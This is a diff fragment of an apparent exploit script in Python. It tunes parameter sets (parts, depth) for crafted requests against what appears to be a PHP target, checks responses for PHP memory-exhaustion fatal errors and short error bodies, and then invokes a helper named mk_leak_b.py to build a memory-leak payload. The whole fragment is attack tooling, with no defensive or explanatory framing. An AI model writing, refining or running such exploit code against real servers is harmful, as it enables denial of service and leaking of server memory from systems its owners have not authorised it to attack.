@@ -43,11 +43,11 @@ def hist(dec):
     return total, mod, low
 
 ARMS = [
-    ("a2000", ["--parts", "2000", "--depth", "62", "--big", "78"]),
-    ("a3000", ["--parts", "3000", "--depth", "62", "--big", "78"]),
-    ("a3400", ["--parts", "3400", "--depth", "62", "--big", "78"]),
-    ("a4000", ["--parts", "4000", "--depth", "62", "--big", "78"]),
-    ("a4900", ["--parts", "4900", "--depth", "62", "--big", "78"]),
+    ("d62p1800", ["--parts", "1800", "--depth", "62"]),
+    ("d32p3600", ["--parts", "3600", "--depth", "32"]),
+    ("d16p7200", ["--parts", "7200", "--depth", "16"]),
+    ("d8p14400", ["--parts", "14400", "--depth", "8"]),
+    ("d4p28800", ["--parts", "28800", "--depth", "4"]),
 ]
 
 for attempt, (tag, knobs) in enumerate(ARMS, start=1):
@@ -67,7 +67,11 @@ for attempt, (tag, knobs) in enumerate(ARMS, start=1):
     print("[*] try%d(%s) A1 %dB -> %s" % (attempt, tag, len(body),
           ("HTTP %d %dB" % (st, len(_b))) if st else "conn-lost"))
     if b"Allowed memory size of" in _b:
-        print("[*] try%d(%s) A1 in-band fatal" % (attempt, tag))
+        print("[*] try%d(%s) A1 fatal: %r" % (attempt, tag,
+              _b[:150].decode("utf-8", "replace")))
+    elif st and len(_b) < 400 and _b:
+        print("[*] try%d(%s) A1 short body: %r" % (attempt, tag,
+              _b[:200].decode("utf-8", "replace")))
 
     b1 = os.path.join(tempfile.mkdtemp(prefix="rc_"), "b1.bin")
     subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"), "--out", b1,
